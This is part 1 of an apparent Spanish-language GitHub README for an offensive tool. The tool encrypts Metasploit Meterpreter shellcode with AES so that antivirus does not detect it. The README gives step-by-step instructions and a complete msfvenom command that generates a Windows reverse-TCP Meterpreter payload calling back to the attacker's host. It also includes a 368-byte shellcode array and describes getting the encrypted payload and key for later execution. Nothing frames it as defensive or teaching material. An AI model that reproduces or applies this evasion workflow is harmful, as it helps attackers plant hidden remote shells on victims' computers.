# Ofuscar-shell-meterpreter-en-AES PARTE 1 DE 2 
Este es un codigo en c# en cual encripta un shell creada con msfvenom en formato csharp 
!! necesitamos usar visual studio code 2015 - 2022 !!
1. tenemos que abrir un nuevo proyecto de windows form en csharp 
2. despues de abirse hay que eliminar el windows form
3. configuramos las propiedasdes dandole click, en la parte de Output type necesitamos cambiar a "Console Aplication"
4. En la parte del targetFramework escogemos .NET Framework 4.7.2 
5. ![imagen](https://github.com/Cristian-M0ntes/Ofuscar-shell-meterpreter-en-AES/assets/79603479/3a7a93c5-8c04-454c-9949-4ea0a62f22dc)
6. abrimos el programa.cs donde pondremos el codigo ofuscar-shell-meterpreter-en-AES
7. vamos a msfvenom y creamos una shell reversa con el siguiente comando

        sudo msfvenom -p windows/meterpreter/x64/reverse_tcp LHOST=<TU IP DE LA MAQUINA ATACANTE> LPORT=4444 -f csharp > payload

        cat payload
9. al hacer cat del archivo veremos algo parecido a esto


            byte[] shellcode_metasploit_aes = new byte[368] { 0xda, 0xe1, 0x9f, 0x6b, 0x10, 0xa7, 0x69, 0x3d, 0xe5, 0x33, 0xf5, 0xed, 0x5c, 0x0a, 0x9a, 0x13, 0x04, 0xa2, 0xea, 0xd1, 0x28, 0xf0, 0xc3, 0xda, 0x3b, 0x3c, 0x80, 0x61, 0xc8, 0x52, 0xd8, 0xaa, 0x4c, 0x3e, 0xd5, 0xef, 0xd0, 0xa3, 0x53, 0x21, 0x74, 0xfc, 0xa3, 0x21, 0x90, 0x2c, 0x46, 0xdd, 0xed, 0x1d, 0x50, 0xf6, 0x7b, 0x4e, 0xb6, 0x87, 0x50, 0x5a, 0x40, 0x9b, 0xcb, 0x72, 0x21, 0x22, 0xee, 0x68, 0xd6, 0x64, 0xf8, 0x4f, 0xe2, 0xed, 0x97, 0x53, 0x9f, 0x72, 0x48, 0x1e, 0x8d, 0x38, 0xbc, 0x05, 0x6b, 0x63, 0x7c, 0x85, 0x26, 0x3b, 0x43, 0x4e, 0x24, 0x70, 0xb9, 0x13, 0xac, 0x9d, 0x18, 0x5d, 0xf6, 0x3e, 0x6a, 0xf5, 0x5e, 0xbd, 0x8e, 0x55, 0xc6, 0x4c, 0x45, 0x7b, 0x4d, 0x32, 0xc5, 0x56, 0x31, 0x81, 0xeb, 0x96, 0xfd, 0x4a, 0x49, 0xfa, 0xd2, 0x0c, 0x56, 0x1b, 0xf2, 0xe1, 0x44, 0xce, 0x5a, 0xdc, 0x36, 0x17, 0xf5, 0x87, 0x52, 0x4e, 0xe9, 0xf1, 0x09, 0x28, 0x90, 0xe2, 0x5f, 0x2f, 0x66, 0x64, 0x36, 0x4e, 0x60, 0x36, 0x84, 0x90, 0x45, 0x95, 0x23, 0xe6, 0x4e, 0xf4, 0xf1, 0xd9, 0x90, 0x2b, 0x8e, 0x91, 0xe1, 0x24, 0x2b, 0xc8, 0xdd, 0xc0, 0xf6, 0x4c, 0x95, 0x61, 0xa3, 0xeb, 0x37, 0x75, 0xed, 0x17, 0x44, 0xa2, 0x06, 0xbd, 0x9a, 0x16, 0x0f, 0xfc, 0x9a, 0x57, 0xe2, 0xbe, 0xd2, 0x82, 0xec, 0x8c, 0x79, 0x32, 0x72, 0xd0, 0x3a, 0x68, 0x9f, 0x35, 0xa8, 0x85, 0x6b, 0x3c, 0xd9, 0x37, 0x98, 0xbd, 0xfd, 0xdc, 0x55, 0xa4, 0x4b, 0xd8, 0xf2, 0x59, 0x9c, 0x7d, 0xec, 0xf2, 0x35, 0xbe, 0xb3, 0xaa, 0x7f, 0x9a, 0x86, 0xf6, 0x7a, 0x42, 0xcf, 0xb2, 0xaa, 0xc3, 0x58, 0xa1, 0xb2, 0x0a, 0x57, 0xd2, 0x75, 0x7b, 0x2f, 0x1d, 0x71, 0x7c, 0xf1, 0x63, 0x24, 0x64, 0x6f, 0x38, 0x3c, 0x37, 0x93, 0xda, 0x7e, 0x74, 0x7c, 0x59, 0x04, 0xe1, 0x9c, 0x99, 0xb6, 0x2f, 0xe8, 0x52, 0xc9, 0x91, 0x34, 0x30, 0xaa, 0xa9, 0x71, 0xcf, 0xe5, 0xcf, 0x21, 0xc5, 0x17, 0x4d, 0xfb, 0x6e, 0x89, 0xe5, 0x88, 0x09, 0xe4, 0x50, 0x2e, 0x4c, 0x50, 0x32, 0x85, 0x7a, 0x77, 0x74, 0xd3, 0xfb, 0x86, 0xa9, 0x75, 0x50, 0xf7, 0x80, 0xb8, 0xca, 0x69, 0x5a, 0xe8, 0xed, 0xb5, 0xec, 0x5a, 0x53, 0x57, 0xf7, 0xde, 0xa8, 0xe6, 0xbf, 0x41, 0xbb, 0x46, 0x5f, 0x07, 0x07, 0x54, 0x4c, 0xbd, 0xb5, 0x86, 0xd2, 0x9e, 0x9f, 0x9c, 0x7d, 0x52, 0x5a, 0x09, 0x87, 0xa2, 0x9f, 0x2e, 0xcb, 0x6d, 0xdd, 0xd3, 0xf0, 0xb0, 0x24, 0xfe, 0x19, 0x61, 0x89, 0x29, 0x76, 0x42, 0xee, 0xfa, 0x81 };
10. este seria nuestro payload 
11. ahora remplazamos nuestro payload por el que se encuentra en ofuscar-shell-meterpreter-en-AES
12. si todo ha salido bien ejecutamos o usamos fn + f5 en mi cazo para iniciar la ejecucion del script que encriptara el reverse shell de metasploit
13. esto nos abrira la consola dandonos el codigo de arriba encriptado + una clave aleatoria que usaremos para poder desencriptar luego
14. guardamos los datos que nos entrego la consola

        seguir a la parte 2 de 2 

